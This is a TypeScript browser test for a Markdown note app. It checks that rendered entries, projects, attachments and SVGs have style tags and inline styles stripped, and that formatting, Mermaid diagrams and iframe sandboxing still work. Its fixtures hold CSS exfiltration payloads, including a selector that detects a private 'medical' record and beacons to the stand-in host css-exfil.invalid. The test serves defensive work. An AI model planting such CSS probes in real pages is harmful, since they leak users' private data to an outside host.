// Bundle and call validateMarkdownSanitization() in a real browser.
// Happy DOM does not implement DOMPurify's node traversal faithfully.
import { renderDiagrams } from '../src/diagrams';
import {
  renderEntry, renderEntryDetail, renderProjectDetail, renderActionDetail,
  renderInstanceDetail, renderArtifactDetail, renderAssetDetail, type RenderOptions,
} from '../src/render';

const stamp = '2026-10-04T09:00';
const id = '2026-10-04-record';
const opts: RenderOptions = {
  now: stamp, nowDate: new Date(stamp), timeFormat: '24h',
  expandProjects: false, expandActions: false, activeFilter: null,
  resolveName: (_type, value) => value, refMarks: () => [], routeHref: route => `/work/${route}`,
  onTagClick: () => {}, onAssetClick: () => {}, onEntryTimeClick: () => {},
};
const frontMatter = { name: 'Record', created: stamp };
const actions = { open: [], done: [], cancelled: [] };
const entry = (content: string) => ({ meta: { created: stamp }, weekFile: '2026-09-28', content });
const contexts: [string, (markdown: string) => HTMLElement][] = [
  ['entry flow', markdown => renderEntry(entry(markdown), opts, document.createElement('main'))],
  ['entry detail', markdown => renderEntryDetail(entry(markdown), opts)],
  ['project detail', markdown => renderProjectDetail(id, { frontMatter, body: markdown }, undefined, opts, [], { actions, stats: [] })],
  ['action detail', markdown => renderActionDetail(id, { frontMatter, body: markdown }, undefined, opts, [])],
  ['instance detail', markdown => renderInstanceDetail({ id: 'work' }, markdown, opts, { projects: [], actions, stats: [] })],
  ['artifact body', markdown => renderArtifactDetail(id, { frontMatter, body: markdown }, undefined, opts)],
  ['Markdown attachment', markdown => renderArtifactDetail(id, { frontMatter: { ...frontMatter, attachments: ['notes.md'] }, body: '' }, undefined,
    opts, undefined, { kind: 'markdown', text: markdown }, 'notes.md')],
  ['supporting Markdown file', markdown => renderAssetDetail('assets/notes.md', { kind: 'markdown', text: markdown }, opts, [])],
];

export async function validateMarkdownSanitization(): Promise<{ checks: number; failures: string[] }> {
  const fixtures = document.createElement('main');
  document.body.append(fixtures);
  const failures: string[] = [];
  let checks = 0;
  const check = (name: string, actual: unknown) => { checks++; if (!actual) failures.push(name); };
  const privateRecord = document.createElement('a');
  privateRecord.dataset.refId = '2026-08-22-medical-appointment';
  fixtures.append(privateRecord);
  try {
    for (const [name, render] of contexts) {
      const root = render('Shared note.\n\n'
        + '<style>body:has(a[data-ref-id*="medical"]) { background-image: url("https://css-exfil.invalid/medical-present"); }</style>\n\n'
        + '<div style="background-image:url(https://css-exfil.invalid/inline)"><strong>Keep this content.</strong></div>');
      fixtures.append(root);
      check(`${name} removes CSS metadata probes and inline styles`, !root.querySelector('style, [style]'));
      check(`${name} removes CSS network destinations`, !root.innerHTML.includes('css-exfil.invalid'));
      check(`${name} preserves harmless content and formatting`, root.textContent?.includes('Shared note.')
        && root.querySelector('strong')?.textContent === 'Keep this content.');
    }
    check('private record metadata remains intact', privateRecord.dataset.refId === '2026-08-22-medical-appointment');
    check('CSS probes cannot apply to the application', !getComputedStyle(document.body).backgroundImage.includes('css-exfil.invalid'));

    const svg = renderEntryDetail(entry('Safe example.\n\n'
      + '<svg xmlns="http://www.w3.org/2000/svg"><style>body { background:url(https://css-exfil.invalid/svg); }</style>'
      + '<text style="fill:red">Caption</text></svg>\n\n'
      + `**Important** [reference](#project/${id}).`), opts);
    fixtures.append(svg);
    check('authored SVG cannot carry CSS', !svg.querySelector('style, [style]') && !svg.innerHTML.includes('css-exfil.invalid'));
    check('safe SVG content survives', svg.querySelector('svg text')?.textContent === 'Caption');
    check('safe Markdown formatting survives', svg.querySelector('strong')?.textContent === 'Important');
    const reference = svg.querySelector(`a[data-ref-id="${id}"]`);
    check('native references retain navigation and their application SVG icon', reference?.getAttribute('href') === `/work/project/${id}`
      && !!reference.querySelector('svg'));

    const css = '<style>body { color: red; }</style>';
    const diagram = 'flowchart LR\n  A[Start] --> B[Finish]';
    const source = renderEntryDetail(entry(`Source examples.\n\n\`${css}\`\n\n\`\`\`html\n${css}\n\`\`\`\n\n\`\`\`mermaid\n${diagram}\n\`\`\``), opts);
    fixtures.append(source);
    check('literal CSS examples remain inert', !source.querySelector('style, [style]'));
    check('literal CSS examples retain their contents', [...source.querySelectorAll('code')].map(code => code.textContent).join('|')
      === [css, `${css}\n`, `${diagram}\n`].join('|'));
    check('Mermaid source is still prepared', source.querySelector('.mermaid-diagram code.language-mermaid')?.textContent === `${diagram}\n`);
    await renderDiagrams(source);
    const drawing = source.querySelector('.mermaid-output > svg');
    check('Mermaid still renders with application-generated styles', !!drawing?.querySelector('style')
      && drawing.getBoundingClientRect().width > 0 && drawing.getBoundingClientRect().height > 0);

    const frameView = renderEntryDetail(entry('<iframe src="../../assets/dashboard.html" height="450" style="position:fixed"></iframe>'),
      { ...opts, assetFileUrl: path => new URL(`/-/fixture/${path}`, location.href).href });
    fixtures.append(frameView);
    const frame = frameView.querySelector('iframe');
    check('iframe dimensions remain application-owned', frame?.style.height === '450px' && frame.style.position === '');
    check('iframe isolation remains intact', frame?.getAttribute('sandbox') === 'allow-scripts'
      && frame.getAttribute('referrerpolicy') === 'no-referrer');
    return { checks, failures };
  } finally { fixtures.remove(); }
}
